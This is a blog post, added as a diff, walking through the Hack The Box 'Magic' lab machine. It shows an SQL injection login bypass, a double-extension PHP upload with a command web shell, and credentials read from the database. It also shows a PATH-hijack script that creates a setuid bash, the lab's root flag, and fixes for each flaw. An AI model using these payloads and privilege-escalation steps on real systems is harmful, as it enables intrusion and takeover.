@@ -1,0 +1,438 @@
+---
+layout: default
+title:  "HTB Magic"
+date:   2025-04-27 16:28:42 +0700
+categories: htb
+---
+
+# Magic
+
+Magic is a Hack The Box (HTB) "Easy" difficulty machine featuring a straightforward but educational attack path. The machine exposes two main services: SSH (port 22) and a web application (port 80). The web application, built on a typical LAMP stack (Linux, Apache, MySQL, PHP), primarily allows users to upload and view images after authentication.
+
+The login mechanism has two separate vulnerabilities that can be exploited to bypass authentication. The file upload feature implements basic security checks on file extensions and magic bytes; however, these protections can be easily bypassed, allowing the upload of a PHP reverse shell.
+
+After gaining initial foothold as the `www-data` (web server) user, further enumeration of the MySQL database reveals credentials for a local system user. As the local user, additional enumeration uncovers a SUID binary vulnerable to path injection, which can be exploited to escalate privileges and gain root access to the machine.
+
+# Reconnaissance
+
+We start by performing an initial port scan using `rustscan` with additional options `nmap` (-A for aggressive scan) to gather detailed service versions and potential vulnerabilities.
+
+```bash
+└─$ rustscan --ulimit 5000 -a 10.129.196.167 -- -A -oA magic.htb
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image.png)
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%201.png)
+
+Based on these results, the target is running an SSH server on port 22 and a web server (Apache) on port 80.
+
+We decide to focus on the web service first, as it is more likely to contain vulnerabilities that can be exploited for initial access.
+
+The web application seems have the feature to show user uploaded image on the site, but require user to login first.
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%202.png)
+
+Login page located on `/login.php` and testing using default credentials like `admin`:`admin` or `user`:`user` doesn't seems to works.
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%203.png)
+
+We will enumerate further using `ffuf`, as this is seems to be LAMP stack we will check file with `.php` extension.
+
+```bash
+└─$ ffuf -u http://10.129.196.167/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .php -ac -ic
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%204.png)
+
+with `ffuf` we discoverd `upload.php`  endpoint. However, attempting to access it directly results in an automatic redirection back to `login.php`. At first I was suspecting SQLi attack to bypass the login.php but after testing using `‘` or `“` payload i didn’t get any error on my end. While testing, I observed the server response header contain `Location:` pointing to `login.php` and the `302` redirect http status code. By manipulating the `Location:` parameter in server response I was able forced browser to show `upload.php` without valid login credentials.
+
+## Login bypass via **Response Manipulation**
+
+To bypass login we will be using burpsuite, send request to upload.php and intercept it.
+
+In burp select `Do intercept` > `Response to this request`, and `select forward` [see image below]
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%205.png)
+
+When you get Response from server, modify `Location: login.php` parameter to `Location: upload.php` and Change HTTP status code from `302` to `200`
+
+![                                                                                    before](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%206.png)
+
+                                                                                    before
+
+![                                                                                          after](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%207.png)
+
+                                                                                          after
+
+and forward all the subsequent request
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%208.png)
+
+Now if you open your web browser you should have access to upload.php
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%209.png)
+
+## Login.php bypass via SQLi
+
+There another method to bypass login which is via SQL injection. Check in Root Analysis section.
+
+# Initial Foothold
+
+## Analyzing the File Upload Feature
+
+analyzing the file upload functionality, we observed that the server implemented basic security controls:
+
+- It checked the **file extension**, allowing only `.jpg`, `.jpeg`, and `.png` files.
+- It also validated the **MIME type** to ensure the uploaded file was an image.
+
+Files that passed these checks were uploaded to the `/images/uploads/` directory. For example:
+
+```ruby
+[http://10.129.196.167/images/uploads/test.](http://10.129.196.167/images/uploads/pepe9.php.jpg)jpg
+```
+
+## Bypass the Upload Filter to Gain Reverse Shell
+
+Initial attempts to bypass the upload restrictions such as using a null byte injection (`%00`) in the filename (e.g., `test.php%00.jpg`) were unsuccessful.
+
+However, a simpler method worked:
+
+- **File Extension Bypass:**
+    
+    Upload a file with a **double extension** like `test.php.jpg`. The server checks only the final `.jpg` extension and allows it.
+    
+- **MIME Type Bypass:**
+    
+    Upload a **legitimate image** (e.g., a real `.jpg` file) but **inject PHP code** into the file during the upload process.
+    
+
+This can be done by intercepting the upload request with Burp Suite (or any web proxy) and modifying the file content.
+
+Steps:
+
+- Upload a real JPEG file (e.g., `test2.jpg`).
+- Intercept the upload request with Burp Suite.
+- Insert the PHP reverse shell payload into the image content manually.
+- Modify the `filename=` field to `test2.php.jpg`.
+- Forward the request to upload the malicious file.
+
+![                                                                                Modified Request](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2010.png)
+
+                                                                                Modified Request
+
+If the file was successfully uploaded, we should be able to access it through the following URL:
+
+```ruby
+http://<Machine-IP>/images/uploads/test2.php.jpg?cmd=id
+```
+
+![                                                                    file upload success](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/9f90a600-fb79-4e3c-9b08-a20c8bc4a801.png)
+
+                                                                    file upload success
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2011.png)
+
+Initial enumeration we discovered `db.php5`, but unable to read via this method and we also discover user `theseus` .
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2012.png)
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2013.png)
+
+![                                                                     /etc/passwd content](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2014.png)
+
+                                                                     /etc/passwd content
+
+To gain initial foothold we will be using [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) PHP Reverse Shell as our PHP payload and using [penelope](https://github.com/brightio/penelope) as listener.
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2015.png)
+
+Enumerating further we able to read `db.php5` 
+
+```php
+ private static $dbName = 'Magic' ;
+ private static $dbHost = 'localhost' ;
+ private static $dbUsername = 'theseus';
+ private static $dbUserPassword = 'iamkingtheseus';
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2016.png)
+
+Unfortunately those credentials cant be used to login as `theseus` directly either via switch user or ssh.
+
+However, we discovered that the **MySQL service** is running on the machine. Although the MySQL client is not installed, we can still **dump the MySQL databases** using `mysqldump`, which can provide valuable information for further exploitation.
+
+```bash
+www-data@magic:/tmp$ mysqldump --all-databases -u theseus -p
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2017.png)
+
+```bash
+LOCK TABLES `login` WRITE;
+/*!40000 ALTER TABLE `login` DISABLE KEYS */;
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+/*!40000 ALTER TABLE `login` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+```
+
+Using credentials from **MySQL** databases we can switch user to `theseus` and get the `user.txt`
+
+```bash
+www-data@magic:/tmp$ su - theseus 
+theseus@magic:~$ cat user.txt 
+e2c5bc**************
+```
+
+# Privilige Escalation
+
+As per usual running [**linPEAS](http://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)** (I’m a bit lazy to concern on opsec for now xD) will help our general enumeration quickly and efficiently.
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2018.png)
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2019.png)
+
+```bash
+theseus@magic:~$ chmod +x linpeas.sh && ./linpeas.sh >> out &
+```
+
+Interesting file that we found is `/bin/sysinfo`  as it has the [setuid](https://www.cbtnuggets.com/blog/technology/system-admin/linux-file-permissions-understanding-setuid-setgid-and-the-sticky-bit) set 
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2020.png)
+
+When we run it will print several system information
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2021.png)
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2022.png)
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2023.png)
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2024.png)
+
+Inspecting a bit using `strings`, we found that it actually using several other binary file
+
+```bash
+theseus@magic:~$ strings /bin/sysinfo 
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2025.png)
+
+As its not using full path to call each `lshw`, `fdisk`, `cat`, or `free` there is possibility to abuse the path execution vulnerability ([CWE-427](https://cwe.mitre.org/data/definitions/427.html)).
+
+To test this we need to modify server PATH env variable, in here I will modify it by adding `/tmp` 
+
+```bash
+theseus@magic:/tmp$ export PATH=/tmp:$PATH
+theseus@magic:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+
+Then create `lshw` (or other mentioned above) bash script to copy `/bin/bash` to `/tmp` and add `chmod u+x` (make the file the bash run as its owner which is root).
+
+```bash
+nano lshw
+```
+
+```bash
+#!/bin/bash
+
+cp /bin/bash /tmp/bash && chmod u+s bash
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2026.png)
+
+Re run `/bin/sysinfo` again and if it sucess you should see `bash` binary in `/tmp` directory  
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2027.png)
+
+Execute it and you should be root 
+
+```bash
+theseus@magic:/tmp$ ./bash -p
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2028.png)
+
+```bash
+bash-4.4# cat root.txt 
+3a589e85ae93847fb2972ff30e72cc51
+```
+
+![image.png](/assets/Magic%201e1c3827f4e0807fba44dd3fe8d9c0f5/image%2029.png)
+
+# Root Analysis
+
+### **Response Manipulation**
+
+The reason why we can access upload.php by tampering the response is because PHP continue to execute the rest of the code even after sending the `Location:` header back to login.php .
+
+<aside>
+💡
+
+The HTTP **`Location`** [response header](https://developer.mozilla.org/en-US/docs/Glossary/Response_header) indicates the URL to redirect a page to. It only provides a meaning when served with a `3XX` [redirection response](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status#redirection_messages) or a [`201 Created`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Status/201) status response.
+
+</aside>
+
+at the beginning of upload.php we see it check if the `$_SESSION` is not set (or user not login), it will redirect user to `login.php` via `header("Location: login.php");` 
+
+ 
+
+```php
+<?php
+session_start();
+
+if (!isset($_SESSION['user_id'])) {
+    header("Location: login.php");
+}
+...SNIP...
+```
+
+as we’re able to capture response from web server via burp, we’re able to manipulate the response and because the rest of upload php still being executed even though we’re not login will still able to access upload.php. To fix this issue we can modify the upload.php to stop the rest of code execution when the $_SESSION is not set
+
+```php
+<?php
+session_start();
+
+if (!isset($_SESSION['user_id'])) {
+    header("Location: login.php");
+    exit(); // or die();
+}
+...SNIP...
+```
+
+## SQL Injection
+
+At first I was testing SQL Injection using normal payload `‘` or `“` and didn't get any error, but it does have different response length compared to invalid login. Only after checking the login.php source code, I notice that it takes user input directly without any sanitazaion
+
+```php
+...SNIP...
+            $stmt = $pdo->query("SELECT * FROM login WHERE username='$username' AND password='$password'");
+...SNIP...
+```
+
+To exploit the SQLi manually we still need help from burp as the username and password from in login.php doesn't accept space character as input. We can subvert its logic to allow us login using payload
+
+```php
+admin' OR 1=1-- -
+```
+
+full URL ecnode payload will be:
+
+```php
+username=admin%27+OR+1%3D1--+-&password=test
+```
+
+To fix this issue, prepared statement can be used [here](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection) or something like this
+
+```php
+...SNIP...
+$pdo = Database::connect();
+$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);
+
+// Use prepared statements to prevent SQL Injection
+$stmt = $pdo->prepare("SELECT * FROM login WHERE username = :username AND password = :password");
+$stmt->execute([
+    ':username' => $username,
+    ':password' => $password
+]);
+
+$user = $stmt->fetch();
+$count = 0;
+...SNIP...
+```
+
+## Sysinfo Analysis
+
+as of this writing, Im currently unable to access my htb pc, we will do it later.
+
+## Login.php Source Code
+
+```php
+<?php
+session_start();
+require 'db.php5';
+if (!empty($_POST['username'])) {
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    if (strpos( strtolower($username), 'sleep') === false && strpos( strtolower($password), 'sleep') === false && strpos( strtolower($username), 'benchmark') === false && strpos( strtolower($password), 'benchmark') === false) {
+        try {
+            $pdo = Database::connect();
+            $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+            $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_OBJ);
+            $stmt = $pdo->query("SELECT * FROM login WHERE username='$username' AND password='$password'");
+            $user = $stmt->fetch();
+            $count = 0;
+            foreach ($user as $value) {
+                $count += 1;
+            }
+            Database::disconnect();
+            if ($count > 0) {
+                $_SESSION['user_id'] = $user->id;
+                header("Location: upload.php");
+            } else {
+                print("<script>alert('Wrong Username or Password')</script>");
+                //print('Wrong Username or Password');
+            }
+        } catch (PDOException $e) {
+            //echo "Error: " . $e->getMessage();
+            //echo "An SQL Error occurred!";
+        }
+    }
+}
+?>
+...SNIP...
+```
+
+## Upload.php Source Code
+
+```bash
+<?php
+session_start();
+
+if (!isset($_SESSION['user_id'])) {
+    header("Location: login.php");
+}
+$target_dir = "images/uploads/";
+$target_file = $target_dir . basename($_FILES["image"]["name"]);
+$uploadOk = 1;
+$allowed = array('2', '3');
+
+// Check if image file is a actual image or fake image
+if (isset($_POST["submit"])) {
+    // Allow certain file formats
+    $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+    if ($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
+        echo "<script>alert('Sorry, only JPG, JPEG & PNG files are allowed.')</script>";
+        $uploadOk = 0;
+    }
+
+    if ($uploadOk === 1) {
+        // Check if image is actually png or jpg using magic bytes
+        $check = exif_imagetype($_FILES["image"]["tmp_name"]);
+        if (!in_array($check, $allowed)) {
+            echo "<script>alert('What are you trying to do there?')</script>";
+            $uploadOk = 0;
+        }
+    }
+    //Check file contents
+    /*$image = file_get_contents($_FILES["image"]["tmp_name"]);
+    if (strpos($image, "<?") !== FALSE) {
+        echo "<script>alert('Detected \"\<\?\". PHP is not allowed!')</script>";
+        $uploadOk = 0;
+    }*/
+
+    // Check if $uploadOk is set to 0 by an error
+    if ($uploadOk === 1) {
+        if (move_uploaded_file($_FILES["image"]["tmp_name"], $target_file)) {
+            echo "The file " . basename($_FILES["image"]["name"]) . " has been uploaded.";
+        } else {
+            echo "Sorry, there was an error uploading your file.";
+        }
+    }
+}
+?>
+...SNIP...
+```
